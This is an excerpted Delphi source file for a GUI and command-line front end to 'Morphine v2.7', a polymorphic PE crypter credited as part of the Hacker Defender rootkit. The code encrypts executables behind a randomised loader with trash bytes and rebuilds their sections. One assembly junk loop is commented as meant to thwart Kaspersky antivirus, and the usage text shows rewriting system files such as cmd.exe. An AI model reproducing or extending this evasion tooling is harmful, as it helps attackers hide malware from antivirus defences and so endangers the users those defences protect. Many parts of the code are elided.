...
type
  TForm1 = class(TForm)
    ...
    btMorphine: TButton;
    ebOutFilename: TEdit;
    btInOpen: TSpeedButton;
    btOutOpen: TSpeedButton;
    Button2: TButton;
    ...
    cbOverlay: TCheckBox;
    procedure btMorphineClick(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure btOutOpenClick(Sender: TObject);
    procedure btInOpenClick(Sender: TObject);
    procedure btMorphineMouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
...
var
  ...
  Procedure Morphine27(InFile, OutFile : String; FixChecksum, IsDll, UseRsrc, Overlay : Boolean; ImageBase : Cardinal = 0);
...
procedure TForm1.btMorphineClick(Sender: TObject);
var
  s : String;
  c : Cardinal;
begin
  ...
  Try
    ...
    Morphine27(ebInFilename.Text, ebOutFilename.Text, cbChecksum.Checked, cbDLL.Checked,
      cbRsrc.Checked, cbOverlay.checked, C);
...
begin
 ...
 Form1.Log.Items.Add('Morphine v2.7');
 Form1.Log.Items.Add('by Holy_Father && Ratter/29A');
 Form1.Log.Items.Add('as a part of Hacker Defender rootkit - http://rootkit.host.sk');
 Form1.Log.Items.Add('Copyright (c) 2000,forever ExEwORx');
 Form1.Log.Items.Add('betatested by ch0pper <THEMASKDEMON@flashmail.com>');
 Form1.Log.Items.Add('birthday: 03.10.2004');

 Form1.Log.Items.Add(' ');
 Form1.Log.Items.Add('Made into plugin for PEiD & PE-Tools by Neil The Hippie Killer / BobSoft');
 Form1.Log.Items.Add('birthday: 11.10.2004');
 Form1.Log.Items.Add(' ');
end;
...
procedure TForm1.btOutOpenClick(Sender: TObject);
begin
  IF fileexists(ebInFilename.Text) Then
    SaveDialog1.InitialDir := ExtractFilePath(ebInFilename.Text);

  SaveDialog1.FileName := Copy(ExtractFilename(ebinfilename.Text),1,Length(ExtractFilename(ebinfilename.Text))-Length(ExtractFileExt(ebinfilename.Text))) + '_Morphed' + ExtractFileExt(ebInFilename.Text);

  If SaveDialog1.Execute Then
    Begin
      ebOutFilename.Text := SaveDialog1.FileName;
      Log.Items.Add('Dest : '+ExtractFilename(ebOutFilename.Text))
    End
  Else
    ebOutFilename.Text := '';

  btMorphine.Enabled := (fileexists(ebInFilename.Text) and (ebOutFilename.Text <> ''));
end;

procedure TForm1.btInOpenClick(Sender: TObject);
begin
  If OpenDialog1.Execute Then
    Begin
      ebInFilename.Text := OpenDialog1.FileName;
      Log.Items.Add('Source : '+ExtractFilename(ebInFilename.Text))
    End
  Else
    ebInFilename.Text := '';
...
procedure TForm1.btMorphineMouseDown(Sender: TObject; Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
  if button = mbright then
    winexec(PChar(ebOutFilename.Text),sw_normal);
end;
...
Begin
  Form1.Log.Items.SaveToFile(Filename);
End;
...
asm
  ...
  mov eax,00004000h             // To thwart Kav :)
  mov ecx,00001000h
 @DynLoader_fake_loop2:
  xor eax,ebx
  sub eax,0B0B1560Dh
  add ax,cx
  ror eax,007h
  add eax,0DEADC0EDh
  loop @DynLoader_fake_loop2
...
begin
 AddLog;
 AddLog('Morphine v2.7');
 AddLog('by Holy_Father && Ratter/29A');
 AddLog('as a part of Hacker Defender rootkit - http://rootkit.host.sk');
 AddLog('Copyright (c) 2000,forever ExEwORx');
 AddLog('betatested by ch0pper <THEMASKDEMON@flashmail.com>');
 AddLog('birthday: 03.10.2004');
 AddLog;
 AddLog('Additions + Gui by Neil The Hippie Killer / BobSoft');
 AddLog('birthday: 11.10.2004');
 AddLog;
end;
...
begin
 ...
 About;
 AddLog('Usage: '+LStr+' [-q] [-d] [-i] [-a] [-b:ImageBase] [-o:OutputFile] InputFile ');
 AddLog('  -q             be quiet (no gui)');
 AddLog('  -d             for dynamic DLLs only');
 AddLog('  -i             save resource icon and XP manifest');
 AddLog('  -a             save overlay data from the end of original file');
 AddLog('  -b:ImageBase   specify image base in hexadecimal string');
 AddLog('                 (it is rounded up to next 00010000 multiple)');
 AddLog('  -o:OutputFile  specify file for output');
 AddLog('                 (InputFile will be rewritten if no OutputFile given)');
 AddLog;
 AddLog('Examples:');
 AddLog('1) '+LStr+' -q c:\winnt\system32\cmd.exe');
 AddLog(' rewrite cmd.exe in system directory and write no info');
 AddLog;
 AddLog('2) '+LStr+' -b:1F000000 -o:newcmd.exe c:\winnt\system32\cmd.exe');
 AddLog(' create new file called newcmd.exe based on cmd.exe in system dir');
 AddLog(' set its image base to 0x1F000000 and display info about processing');
 AddLog;
 AddLog('3) '+LStr+' -d static.dll');
 AddLog(' rewrite static.dll which is loaded only dynamically');
 AddLog;
 AddLog('4) '+LStr+' -i -o:cmdico.exe c:\winnt\system32\cmd.exe');
 AddLog(' create new file called cmdico.exe based on cmd.exe in system dir');
 AddLog(' save its icon and or XP manifest in resource section');
 AddLog;
 AddLog('5) '+LStr+' -i -a srv.exe');
 AddLog(' rewrite srv.exe, save its icon, XP manifest and overlay data');
 AddLog;
 Form1.Log.Items.SaveToFile(ParamStr(0)+'Usage.Txt');
 Halt;
end;

procedure ErrorMsg(AErrorMsg:string);
begin
 if not Quiet then AddLog('Error ('+IntToStr(GetLastError)+'): '+AErrorMsg);
end;
...
begin
 ...
 DynamicDll := IsDll;
 SaveIcon := UseRsrc;
 ReqImagebase := ImageBase;
 SaveOverlay := Overlay;

 if InputFilename = '-?' then Usage;
 If InputFilename = '' then processCmdLine;
 ...
 begin
  ...
  if not Quiet then AddLog('InputFile: '+InputFileName+' ('+IntToStr(MainRealSize)+')');
    ...
    begin
     ...
     begin
      ...
      begin
       AddLog;
       case ImageType of
        itExe:AddLog('ImageType: Executable');
        itDLL:AddLog('ImageType: Dynamic Linking Library');
        itSys:AddLog('ImageType: System Driver');
        else AddLog('ImageType: unknown');
       end;
       if (HostSubSystem=IMAGE_SUBSYSTEM_WINDOWS_GUI) then AddLog('Subsystem: Windows GUI')
       else AddLog('Subsystem: Windows character');
      end;
      ...
      begin
       ...
       begin
        AddLog('.tls section is present');
        AddLog('original .tls section size: '+IntToStr(TlsSectionSize));
       end else AddLog('.tls section not present');

       if ExportSectionPresent then
       begin
        if not DynamicDLL then
        begin
         AddLog('export section is present');
         AddLog('original export section size: '+IntToStr(ExportSectionSize));
        end else AddLog('Dynamic DLL - export section not used');
       end else AddLog('export section not present');

       if ResourceSectionPresent then
       begin
        if SaveIcon then AddLog('resource section present')
        else AddLog('resource section present but not used');
       end else AddLog('resource section not present');

       if OverlayPresent then
       begin
        if SaveOverlay then AddLog('overlay data present')
        else AddLog('overlay data present but not used');
       end else AddLog('overlay data not present');
      end;
      ...
      begin
       ...
       if not ResourceSectionPresent then
        if not Quiet then AddLog('resource section has no icon or XP manifest');
      end;
      ...
      begin
       ...
       begin
        AddLog;
        AddLog('Loader size: '+IntToStr(LoaderSize));
       end;
       ...
       begin
        ...
        KeySize:=Random(300)+75;
        KeyPtr:=Random(200);
        LoaderPtr:=KeyPtr+KeySize;
        Trash2Size:=Random(256)+20;
 
        if not Quiet then AddLog('Encryption key size: '+IntToStr(KeySize));
        Key:=MyAlloc(KeySize);
        if Key<>nil then
        begin
         ...
         if not Quiet then AddLog('Building NT headers ...');
         ...
         if not Quiet then AddLog('Number of sections: '+IntToStr(NtHeaders.FileHeader.NumberOfSections));
         ...
         if not Quiet then AddLog('ImageBase: '+IntToHex(NtHeaders.OptionalHeader.ImageBase,8));
         ...
         if not Quiet then
         begin
          AddLog('.text section virtual address: '+IntToHex(CodeSection.VirtualAddress,8));
          AddLog('.text section virtual size: '+IntToHex(CodeSection.Misc.VirtualSize,8));
         end;
 
         if not Quiet then
         begin
          AddLog;
          AddLog('Building .idata section');
         end;
         ...
         if not Quiet then
         begin
          AddLog('.idata section virtual address: '+IntToHex(ImportSection.VirtualAddress,8));
          AddLog('.idata section virtual size: '+IntToHex(ImportSection.Misc.VirtualSize,8));
         end;
         ...
         begin
          ...
          if not Quiet then
          begin
           AddLog('.tls section virtual address: '+IntToHex(TlsSection.VirtualAddress,8));
           AddLog('.tls section virtual size: '+IntToHex(TlsSection.Misc.VirtualSize,8));
           if not TlsSectionPresent then AddLog('.tls section is invalid, new executable may not work');
          end;
         end;
         ...
         begin
          ...
          if not Quiet then
          begin
           AddLog('export section virtual address: '+IntToHex(ExportSection.VirtualAddress,8));
           AddLog('export section virtual size: '+IntToHex(ExportSection.Misc.VirtualSize,8));
          end;
         end;
         ...
         begin
          ...
          if not Quiet then
          begin
           AddLog('resource section virtual address: '+IntToHex(ResourceSection.VirtualAddress,8));
           AddLog('resource section virtual size: '+IntToHex(ResourceSection.Misc.VirtualSize,8));
          end;
         end;
         ...
         begin
          AddLog;
          AddLog('Building import descriptor ...');
         end;
         ZeroMemory(@ImportDesc,SizeOf(ImportDesc));
         ...
         begin
          AddLog;
          AddLog('Building polymorphic part ...');
         end;
         TrashSize:=KeyPtr;
         if not Quiet then
         begin
          AddLog('Key address: '+IntToHex(KeyPtr,8));
          AddLog('Loader address: '+IntToHex(LoaderPtr,8));
          AddLog('Trash bytes size: '+IntToStr(TrashSize));
          AddLog('Trash2 bytes size: '+IntToStr(Trash2Size));
         end;
         ...
         begin
          ...
          if not Quiet then AddLog('Executable entry point: '+IntToHex(NtHeaders.OptionalHeader.AddressOfEntryPoint,8));
          ...
          begin
           ...
           if not Quiet then AddLog('Generating init code ...');
           ...
           begin
            AddLog;
            AddLog('Building OutputFile ...');
           end;
           FileHandle:=CreateFile(PChar(OutputFileName),GENERIC_READ + GENERIC_WRITE,0,nil,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
           ...
           begin
            ...
            if not Quiet then
            begin
             AddLog('OutputFile: '+OutputFileName+' ('+IntToStr(TotalFileSize)+')');
             AddLog('Size of new stuff: '+IntToStr(TotalFileSize-MainRealSize)+' bytes');
             AddLog;
             AddLog('Writing data ...');
             LogCnt:=0;
             AddLog(IntToHex(LogCnt,8)+': DOS header');
             Inc(LogCnt,SizeOf(DosHeader));
             AddLog(IntToHex(LogCnt,8)+': DOS stub');
             Inc(LogCnt,SizeOf(DosStub));
             AddLog(IntToHex(LogCnt,8)+': DOS stub end');
             Inc(LogCnt,SizeOf(DosStubEnd));
             AddLog(IntToHex(LogCnt,8)+': NT headers');
             Inc(LogCnt,SizeOf(NtHeaders));
             AddLog(IntToHex(LogCnt,8)+': Code section header');
             Inc(LogCnt,SizeOf(CodeSection));
             AddLog(IntToHex(LogCnt,8)+': Import section header');
             Inc(LogCnt,SizeOf(ImportSection));
             if ExportSectionPresent then
             begin
              AddLog(IntToHex(LogCnt,8)+': Export section header');
              Inc(LogCnt,SizeOf(ExportSection));
             end;
             if TlsSectionPresent then
             begin
              AddLog(IntToHex(LogCnt,8)+': TLS section header');
              Inc(LogCnt,SizeOf(TlsSection));
             end;
             if ResourceSectionPresent then
               AddLog(IntToHex(LogCnt,8)+': Resource section header');

             LogCnt:=CodeSection.PointerToRawData;
             AddLog(IntToHex(LogCnt,8)+': .text:Trash');
             Inc(LogCnt,TrashSize);
             AddLog(IntToHex(LogCnt,8)+': .text:Key');
             Inc(LogCnt,KeySize);
             AddLog(IntToHex(LogCnt,8)+': .text:DynLoader');
             Inc(LogCnt,LoaderSize);
             AddLog(IntToHex(LogCnt,8)+': .text:Trash2');
             Inc(LogCnt,Trash2Size);
             AddLog(IntToHex(LogCnt,8)+': .text:Init code');
             Inc(LogCnt,InitSize);

             AddLog(IntToHex(LogCnt,8)+': .text:Host file');

             LogCnt:=ImportSection.PointerToRawData;
             AddLog(IntToHex(LogCnt,8)+': .idata');
             if TlsSectionPresent then
             begin
              LogCnt:=TlsSection.PointerToRawData;
              AddLog(IntToHex(LogCnt,8)+': .tls');
             end;
             if ExportSectionPresent then
             begin
              LogCnt:=ExportSection.PointerToRawData;
              AddLog(IntToHex(LogCnt,8)+': .edata');
             end;
             if ResourceSectionPresent then
             begin
              LogCnt:=ResourceSection.PointerToRawData;
              AddLog(IntToHex(LogCnt,8)+': .rsrc');
             end;

             if OverlayPresent then
             begin
              LogCnt:=TotalFileSize-AfterImageOverlaysSize;
              AddLog(IntToHex(LogCnt,8)+': overlay data');
             end;
            end;
            ...
            If FixChecksum Then       // Fix Checksum
            Begin
             SetFilePointer(FileHandle,0,nil,FILE_BEGIN);
             PB := MyAlloc(TotalFileSize);
             ReadFile(FileHandle,PB^,TotalFileSize,NumBytes,Nil);
             Asm
              pushad
              mov eax, PB
              Mov ebx, TotalFileSize
              push	esi
	  	        xor	edx, edx
		          mov	esi, eax
  		        mov	ecx, ebx
             ...
             @next_word:
              movzx	eax, word [esi]
		          ...
		          shr	eax, 10h
  		        add	ax, dx
	  	        adc	eax, ebx			// add Filelength    (adc works, add eax,ebx doesn't ??)
		          pop	esi
              mov NumBytes,EAX
              popad
             End;
             MyFree(PB);
             NtHeaders.OptionalHeader.CheckSum := NumBytes;

             SetFilePointer(FileHandle,SizeOf(DosHeader)+SizeOf(DosStub)+SizeOf(DosStubEnd),nil,FILE_BEGIN);
             WriteFile(FileHandle,NtHeaders,SizeOf(NtHeaders),NumBytes,nil);
             AddLog;
             AddLog('Checksum set to $'+IntToHex(NtHeaders.OptionalHeader.CheckSum,8));
             AddLog;
            End;

            if not Quiet then AddLog('Work completed!');
